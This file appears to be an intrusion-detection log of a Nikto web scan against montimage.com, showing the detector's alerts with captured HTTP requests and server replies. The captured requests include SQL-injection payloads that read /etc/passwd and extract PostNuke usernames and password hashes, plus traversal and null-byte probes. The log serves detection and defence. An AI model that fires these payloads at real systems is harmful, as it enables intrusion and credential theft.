10,0,"",1493029573,15,"detected","attack","Nikto detection", {"event_1":{"timestamp":1481903965.993722,"counter":1516,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000689)"}]},"event_2":{"timestamp":1481903965.993722,"counter":1516,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,19,"detected","attack","", {"event_1":{"timestamp":1481903965.993722,"counter":1516,"attributes":[{"tcp.payload_len":244}]},"event_2":{"timestamp":1481903965.993722,"counter":1516,"attributes":[{"tcp.payload_len":244},{"tcp.p_payload":"GET /site/' UNION ALL SELECT FileToClob('/etc/passwd','server')::html,0 FROM sysusers WHERE username = USER --/.html HTTP/1.1..Host: montimage.com..Connection: Keep-Alive..User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000689)...."}]}}
10,0,"",1493029573,12,"detected","evasion","", {"event_1":{"timestamp":1481903965.993833,"counter":1517,"attributes":[{"http.method":"GET"},{"http.uri":"/site/' UNION ALL SELECT FileToClob('/etc/passwd','server')::html,0 FROM sysusers WHERE username = USER --/.html"}]},"event_2":{"timestamp":1481903965.993833,"counter":1517,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903965.993833,"counter":1517,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000689)"}]},"event_2":{"timestamp":1481903965.993833,"counter":1517,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,19,"detected","attack","", {"event_1":{"timestamp":1481903965.993833,"counter":1517,"attributes":[{"tcp.payload_len":244}]},"event_2":{"timestamp":1481903965.993833,"counter":1517,"attributes":[{"tcp.payload_len":244},{"tcp.p_payload":"GET /site/' UNION ALL SELECT FileToClob('/etc/passwd','server')::html,0 FROM sysusers WHERE username = USER --/.html HTTP/1.1..Host: montimage.com..Connection: Keep-Alive..User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000689)...."}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.021555,"counter":1527,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000690)"}]},"event_2":{"timestamp":1481903966.021555,"counter":1527,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,19,"detected","attack","", {"event_1":{"timestamp":1481903966.021555,"counter":1527,"attributes":[{"tcp.payload_len":372}]},"event_2":{"timestamp":1481903966.021555,"counter":1527,"attributes":[{"tcp.payload_len":372},{"tcp.p_payload":"GET /postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1..Host: montimage.com..Connection: Keep-Alive..User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000690)...."}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.021663,"counter":1528,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000690)"}]},"event_2":{"timestamp":1481903966.021663,"counter":1528,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,19,"detected","attack","", {"event_1":{"timestamp":1481903966.021663,"counter":1528,"attributes":[{"tcp.payload_len":372}]},"event_2":{"timestamp":1481903966.021663,"counter":1528,"attributes":[{"tcp.payload_len":372},{"tcp.p_payload":"GET /postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1..Host: montimage.com..Connection: Keep-Alive..User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000690)...."}]}}
10,0,"",1493029573,19,"detected","attack","", {"event_1":{"timestamp":1481903966.032918,"counter":1529,"attributes":[{"tcp.payload_len":837}]},"event_2":{"timestamp":1481903966.032918,"counter":1529,"attributes":[{"tcp.payload_len":837},{"tcp.p_payload":"HTTP/1.1 301 Moved Permanently..Server: Varnish..Location: http://www.montimage.com/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*..Content-Type: text/html; charset=utf-8..Cache-Control: max-age=10800..Content-Length: 315..Accept-Ranges: bytes..Date: Fri, 16 Dec 2016 15:59:26 GMT..Via: 1.1 varnish..Connection: close..Age: 3.....<?xml version=.1.0. encoding=.utf-8.?>.<!DOCTYPE html PUBLIC .-//W3C//DTD XHTML 1.0 Strict//EN.. .http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd.>.<html>.  <head>.    <title>301 Moved Permanently</title>.  </head>.  <body>.    <h1>Error 301 Moved Permanently</h1>.    <p>Moved Permanently</p>.  </body>.</html>."}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.047341,"counter":1541,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000691)"}]},"event_2":{"timestamp":1481903966.047341,"counter":1541,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,19,"detected","attack","", {"event_1":{"timestamp":1481903966.047341,"counter":1541,"attributes":[{"tcp.payload_len":377}]},"event_2":{"timestamp":1481903966.047341,"counter":1541,"attributes":[{"tcp.payload_len":377},{"tcp.p_payload":"GET /postnuke/html/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1..Connection: Keep-Alive..Host: montimage.com..User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000691)...."}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.047441,"counter":1542,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000691)"}]},"event_2":{"timestamp":1481903966.047441,"counter":1542,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,19,"detected","attack","", {"event_1":{"timestamp":1481903966.047441,"counter":1542,"attributes":[{"tcp.payload_len":377}]},"event_2":{"timestamp":1481903966.047441,"counter":1542,"attributes":[{"tcp.payload_len":377},{"tcp.p_payload":"GET /postnuke/html/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1..Connection: Keep-Alive..Host: montimage.com..User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000691)...."}]}}
10,0,"",1493029573,19,"detected","attack","", {"event_1":{"timestamp":1481903966.058486,"counter":1543,"attributes":[{"tcp.payload_len":842}]},"event_2":{"timestamp":1481903966.058486,"counter":1543,"attributes":[{"tcp.payload_len":842},{"tcp.p_payload":"HTTP/1.1 301 Moved Permanently..Server: Varnish..Location: http://www.montimage.com/postnuke/html/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*..Content-Type: text/html; charset=utf-8..Cache-Control: max-age=10800..Content-Length: 315..Accept-Ranges: bytes..Date: Fri, 16 Dec 2016 15:59:26 GMT..Via: 1.1 varnish..Connection: close..Age: 3.....<?xml version=.1.0. encoding=.utf-8.?>.<!DOCTYPE html PUBLIC .-//W3C//DTD XHTML 1.0 Strict//EN.. .http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd.>.<html>.  <head>.    <title>301 Moved Permanently</title>.  </head>.  <body>.    <h1>Error 301 Moved Permanently</h1>.    <p>Moved Permanently</p>.  </body>.</html>."}]}}
10,0,"",1493029573,12,"detected","evasion","", {"event_1":{"timestamp":1481903966.073780,"counter":1557,"attributes":[{"http.method":"GET"},{"http.uri":"/phpwebsite/index.php?module=calendar&calendar[view]=day&year=2003%00-1&month="}]},"event_2":{"timestamp":1481903966.073780,"counter":1557,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.073780,"counter":1557,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000693)"}]},"event_2":{"timestamp":1481903966.073780,"counter":1557,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,12,"detected","evasion","", {"event_1":{"timestamp":1481903966.073904,"counter":1558,"attributes":[{"http.method":"GET"},{"http.uri":"/phpwebsite/index.php?module=calendar&calendar[view]=day&year=2003%00-1&month="}]},"event_2":{"timestamp":1481903966.073904,"counter":1558,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.073904,"counter":1558,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000693)"}]},"event_2":{"timestamp":1481903966.073904,"counter":1558,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,12,"detected","evasion","C4_Analyse_03c|d|e : HTTP packet URI contains non authorised characteres according to RFC2396 and RFC2234 or possibly directory traversal attack.", {"event_1":{"timestamp":1481903966.102250,"counter":1570,"attributes":[{"http.method":"GET"},{"http.uri":"/phpBB2/search.php?search_id=1.."}]},"event_2":{"timestamp":1481903966.102250,"counter":1570,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.102250,"counter":1570,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000694)"}]},"event_2":{"timestamp":1481903966.102250,"counter":1570,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,12,"detected","evasion","", {"event_1":{"timestamp":1481903966.102356,"counter":1571,"attributes":[{"http.method":"GET"},{"http.uri":"/phpBB2/search.php?search_id=1.."}]},"event_2":{"timestamp":1481903966.102356,"counter":1571,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.102356,"counter":1571,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000694)"}]},"event_2":{"timestamp":1481903966.102356,"counter":1571,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","Nikto detection", {"event_1":{"timestamp":1481903966.127307,"counter":1583,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000695)"}]},"event_2":{"timestamp":1481903966.127307,"counter":1583,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,19,"detected","attack","SQL Injection detected", {"event_1":{"timestamp":1481903966.127307,"counter":1583,"attributes":[{"tcp.payload_len":363}]},"event_2":{"timestamp":1481903966.127307,"counter":1583,"attributes":[{"tcp.payload_len":363},{"tcp.p_payload":"GET /index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1..User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000695)..Connection: Keep-Alive..Host: montimage.com...."}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.127459,"counter":1584,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000695)"}]},"event_2":{"timestamp":1481903966.127459,"counter":1584,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,19,"detected","attack","", {"event_1":{"timestamp":1481903966.127459,"counter":1584,"attributes":[{"tcp.payload_len":363}]},"event_2":{"timestamp":1481903966.127459,"counter":1584,"attributes":[{"tcp.payload_len":363},{"tcp.p_payload":"GET /index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1..User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000695)..Connection: Keep-Alive..Host: montimage.com...."}]}}
10,0,"",1493029573,19,"detected","attack","", {"event_1":{"timestamp":1481903966.138818,"counter":1585,"attributes":[{"tcp.payload_len":828}]},"event_2":{"timestamp":1481903966.138818,"counter":1585,"attributes":[{"tcp.payload_len":828},{"tcp.p_payload":"HTTP/1.1 301 Moved Permanently..Server: Varnish..Location: http://www.montimage.com/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*..Content-Type: text/html; charset=utf-8..Cache-Control: max-age=10800..Content-Length: 315..Accept-Ranges: bytes..Date: Fri, 16 Dec 2016 15:59:26 GMT..Via: 1.1 varnish..Connection: close..Age: 3.....<?xml version=.1.0. encoding=.utf-8.?>.<!DOCTYPE html PUBLIC .-//W3C//DTD XHTML 1.0 Strict//EN.. .http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd.>.<html>.  <head>.    <title>301 Moved Permanently</title>.  </head>.  <body>.    <h1>Error 301 Moved Permanently</h1>.    <p>Moved Permanently</p>.  </body>.</html>."}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.155832,"counter":1596,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000696)"}]},"event_2":{"timestamp":1481903966.155832,"counter":1596,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.155941,"counter":1597,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000696)"}]},"event_2":{"timestamp":1481903966.155941,"counter":1597,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.181666,"counter":1610,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001110)"}]},"event_2":{"timestamp":1481903966.181666,"counter":1610,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.181968,"counter":1611,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001110)"}]},"event_2":{"timestamp":1481903966.181968,"counter":1611,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.208062,"counter":1624,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001388)"}]},"event_2":{"timestamp":1481903966.208062,"counter":1624,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.208336,"counter":1625,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001388)"}]},"event_2":{"timestamp":1481903966.208336,"counter":1625,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.242317,"counter":1638,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001389)"}]},"event_2":{"timestamp":1481903966.242317,"counter":1638,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.242676,"counter":1639,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001389)"}]},"event_2":{"timestamp":1481903966.242676,"counter":1639,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","Nikto detection", {"event_1":{"timestamp":1481903966.278101,"counter":1651,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"}]},"event_2":{"timestamp":1481903966.278101,"counter":1651,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.278396,"counter":1652,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"}]},"event_2":{"timestamp":1481903966.278396,"counter":1652,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.310212,"counter":1664,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"}]},"event_2":{"timestamp":1481903966.310212,"counter":1664,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.310482,"counter":1665,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"}]},"event_2":{"timestamp":1481903966.310482,"counter":1665,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.342977,"counter":1678,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"}]},"event_2":{"timestamp":1481903966.342977,"counter":1678,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.343536,"counter":1679,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"}]},"event_2":{"timestamp":1481903966.343536,"counter":1679,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.367610,"counter":1692,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"}]},"event_2":{"timestamp":1481903966.367610,"counter":1692,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.367823,"counter":1693,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"}]},"event_2":{"timestamp":1481903966.367823,"counter":1693,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.392630,"counter":1705,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"}]},"event_2":{"timestamp":1481903966.392630,"counter":1705,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.392751,"counter":1706,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"}]},"event_2":{"timestamp":1481903966.392751,"counter":1706,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","Nikto detection", {"event_1":{"timestamp":1481903966.418922,"counter":1717,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"}]},"event_2":{"timestamp":1481903966.418922,"counter":1717,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.419030,"counter":1718,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"}]},"event_2":{"timestamp":1481903966.419030,"counter":1718,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.442904,"counter":1730,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"}]},"event_2":{"timestamp":1481903966.442904,"counter":1730,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.443017,"counter":1731,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"}]},"event_2":{"timestamp":1481903966.443017,"counter":1731,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.465835,"counter":1744,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"}]},"event_2":{"timestamp":1481903966.465835,"counter":1744,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.465964,"counter":1745,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"}]},"event_2":{"timestamp":1481903966.465964,"counter":1745,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.493779,"counter":1758,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"}]},"event_2":{"timestamp":1481903966.493779,"counter":1758,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.493966,"counter":1759,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"}]},"event_2":{"timestamp":1481903966.493966,"counter":1759,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.522613,"counter":1771,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"}]},"event_2":{"timestamp":1481903966.522613,"counter":1771,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.522732,"counter":1772,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"}]},"event_2":{"timestamp":1481903966.522732,"counter":1772,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","Nikto detection", {"event_1":{"timestamp":1481903966.549020,"counter":1784,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"}]},"event_2":{"timestamp":1481903966.549020,"counter":1784,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.549217,"counter":1785,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"}]},"event_2":{"timestamp":1481903966.549217,"counter":1785,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.578495,"counter":1797,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"}]},"event_2":{"timestamp":1481903966.578495,"counter":1797,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.578600,"counter":1798,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"}]},"event_2":{"timestamp":1481903966.578600,"counter":1798,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.604648,"counter":1811,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391)"}]},"event_2":{"timestamp":1481903966.604648,"counter":1811,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
10,0,"",1493029573,15,"detected","attack","", {"event_1":{"timestamp":1481903966.604774,"counter":1812,"attributes":[{"http.user_agent":"Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391)"}]},"event_2":{"timestamp":1481903966.604774,"counter":1812,"attributes":[{"ip.src":"192.168.0.49"},{"ip.dst":"217.70.184.38"}]}}
